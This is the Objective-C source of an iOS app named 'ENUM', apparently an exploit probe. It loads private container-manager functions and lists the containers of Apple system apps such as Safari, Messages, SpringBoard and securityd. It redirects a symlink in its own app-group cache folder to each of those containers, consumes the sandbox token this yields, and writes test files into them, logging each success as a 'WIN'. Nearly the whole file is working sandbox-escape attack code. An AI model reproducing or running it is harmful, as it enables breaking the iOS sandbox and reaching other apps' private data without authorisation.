// ENUM — enumerate app data/system containers and test part-symlink token/write on them
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <string.h>
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef const char *(*fn_get_ident)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void *(*fn_xpc_array_create)(const void *, size_t);
typedef void (*fn_xpc_array_append)(void *, void *);
typedef void (*fn_xpc_release)(void *);
typedef void (*fn_iterate)(void *, void *);
static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group,q_set_ids,q_include;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_get_ident q_ident; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_array_create xpc_array_create; static fn_xpc_array_append xpc_array_append; static fn_xpc_release xpc_release_fn;
static fn_iterate q_iterate;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;
static NSMutableArray *gFound;
static void L(NSString *fmt, ...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[enum] %@",s);}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h)return NO;q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_set_ids=dlsym(h,"container_query_set_identifiers");q_include=dlsym(h,"container_query_set_include_other_owners");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_iterate=dlsym(h,"container_query_iterate_results_sync");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_ident=dlsym(h,"container_object_get_identifier");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_array_create=dlsym(RTLD_DEFAULT,"xpc_array_create");xpc_array_append=dlsym(RTLD_DEFAULT,"xpc_array_append_value");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");return q_create&&q_iterate&&q_path&&q_ident&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static int64_t queryG(NSString**pathOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,3);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}
static void tw(NSString*tag,NSString*path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;if(fd>=0){write(fd,"ENUM",4);close(fd);L(@"[WIN %@] %@",tag,path);}else L(@"[w %@] errno=%d %@",tag,e,path);}
static NSString *rootOf(NSString*p){if([p hasSuffix:@"/Library/Caches"])return [p substringToIndex:p.length-15];if([p hasSuffix:@"/Library"])return [p substringToIndex:p.length-8];return p;}
static void enumerateClass(int cls,NSArray*ids,NSString*tag){void*q=q_create();q_class(q,cls);if(q_include)q_include(q,true);if(q_set_ids&&ids.count){void*a=xpc_array_create?xpc_array_create(NULL,0):NULL;for(NSString*i in ids){void*s=xpc_string?xpc_string(i.UTF8String):NULL;if(s&&a)xpc_array_append(a,s);}if(a)q_set_ids(q,a);}q_part(q,3);q_flags(q,0x8000000000ULL);__block int n=0;NSMutableArray*found=[NSMutableArray array];BOOL(^blk)(void*)=^BOOL(void*obj){@autoreleasepool{const char*id=q_ident?q_ident(obj):NULL;const char*pa=q_path?q_path(obj):NULL;NSString*si=id?[NSString stringWithUTF8String:id]:@"(null)";NSString*sp=pa?[NSString stringWithUTF8String:pa]:@"(null)";if(n<80)L(@"[%@] id=%@ path=%@",tag,si,sp);if(pa)[found addObject:@[si,sp]];n++;return n<400;}};L(@"[%@] start class=%d ids=%lu",tag,cls,(unsigned long)ids.count);if(q_iterate)q_iterate(q,(__bridge void*)blk);L(@"[%@] done n=%d",tag,n);for(NSArray*pair in found){[gFound addObject:pair];}if(q_free)q_free(q);}
static void testPath(NSString*ident,NSString*path){NSString*root=rootOf(path);if(![root hasPrefix:@"/private/var/"])root=[@"/private" stringByAppendingString:root];L(@"[test] id=%@ root=%@",ident,root);NSString*p=nil;NSFileManager*fm=[NSFileManager defaultManager];[fm removeItemAtPath:gPart error:nil];symlink(root.fileSystemRepresentation,gPart.fileSystemRepresentation);int64_t h=queryG(&p);L(@"[test] id=%@ token=%lld path=%@",ident,(long long)h,p?:@"(null)");if(h>=0){tw([ident stringByAppendingString:@"-root"],[root stringByAppendingPathComponent:@"omni_enum_test"]);tw([ident stringByAppendingString:@"-lib"],[root stringByAppendingPathComponent:@"Library/omni_enum_test"]);if(s_release)s_release(h);}}
static void run(void){@autoreleasepool{
    L(@"=== enum start uid=%d pid=%d",getuid(),getpid()); if(!loadMCM())return;
    gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
    gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
    gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
    gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSFileManager*fm=[NSFileManager defaultManager];[fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
    gFound=[NSMutableArray array];
    NSArray*apps=@[@"com.apple.Preferences",@"com.apple.mobilesafari",@"com.apple.MobileSMS",@"com.apple.mobilemail",@"com.apple.Photos",@"com.apple.springboard",@"com.apple.installd",@"com.apple.containermanagerd",@"com.apple.securityd",@"com.apple.trustd",@"com.apple.mobileassetd",@"com.apple.lsd",@"com.apple.backboardd",@"com.apple.runningboardd"];
    enumerateClass(2,apps,@"c2");
    enumerateClass(12,apps,@"c12");
    enumerateClass(7,@[gGroup],@"c7");
    NSMutableSet*seen=[NSMutableSet set];
    for(NSArray*pair in gFound){NSString*id=pair[0];NSString*pa=pair[1];if(![id hasPrefix:@"com.apple"])continue;if([seen containsObject:pa])continue;[seen addObject:pa];if([id isEqualToString:@"com.apple.mobilesafari"]||[id isEqualToString:@"com.apple.Preferences"]||[id isEqualToString:@"com.apple.springboard"]||[id isEqualToString:@"com.apple.MobileSMS"]||[id isEqualToString:@"com.apple.securityd"])testPath(id,pa);}
    [fm removeItemAtPath:gPart error:nil];symlink(gValid.fileSystemRepresentation,gPart.fileSystemRepresentation);
    L(@"=== enum done ===");
}}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"ENUM";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"enum.log"]copy];gLog=[NSMutableString new];L(@"=== enum launch ===");dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
